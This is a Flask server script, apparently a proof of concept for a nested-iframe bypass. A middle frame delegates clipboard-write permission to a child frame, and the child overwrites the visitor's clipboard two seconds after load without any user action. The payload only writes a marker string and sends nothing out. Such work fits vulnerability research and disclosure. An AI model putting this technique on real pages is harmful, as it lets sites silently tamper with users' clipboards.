from flask import Flask, Response

app = Flask(__name__)

@app.route("/middle")
def middle():
    html_payload = """
    <!DOCTYPE html>
    <html lang="en">
    <body style="background: #ffe6e6;">
        <h4>[Level 1] Middle Iframe</h4>
        <p>Gua gak punya izin, tapi gua inject allow="clipboard-write" ke anak gua.</p>
        
        <iframe 
            src="/payload" 
            allow="clipboard-write" 
            style="width: 90%; height: 150px; border: 2px dashed blue;">
        </iframe>
    </body>
    </html>
    """
    return Response(html_payload, mimetype="text/html")

@app.route("/payload")
def payload():
    html_payload = """
    <!DOCTYPE html>
    <html lang="en">
    <body style="background: #e6f7ff;">
        <h4>[Level 2] Final Payload</h4>
        <div id="log" style="font-family: monospace; font-size: 11px;"></div>

        <script>
            function log(msg) { document.getElementById('log').innerHTML += "> " + msg + "<br>"; }

            window.onload = () => {
                log("Waiting 2s for auto-hijack...");
                setTimeout(async () => {
                    try {
                        await navigator.clipboard.writeText("PoC - Nested Iframe Bypass - Putra Mahardika");
                        log("<span style='color: green; font-weight: bold;'>SUCCESS: Clipboard Hijacked from Level 2!</span>");
                    } catch (e) {
                        log("<span style='color: red;'>BLOCKED: " + e.message + "</span>");
                    }
                }, 2000);
            };
        </script>
    </body>
    </html>
    """
    return Response(html_payload, mimetype="text/html")

if __name__ == "__main__":
    print("[*] Server running on http://127.0.0.1:8080")
    app.run(host="0.0.0.0", port=8080)